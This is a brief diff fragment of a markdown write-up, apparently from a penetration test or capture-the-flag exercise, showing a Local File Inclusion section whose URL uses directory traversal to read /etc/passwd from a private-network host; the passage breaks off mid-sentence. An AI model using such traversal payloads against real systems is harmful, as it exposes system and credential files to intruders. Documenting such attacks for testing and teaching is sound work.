@@ -16,6 +16,7 @@ ___
 ## Description:  
 ### Local File Inclusion
 
+
 `http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd
 
 if that doesn't work try
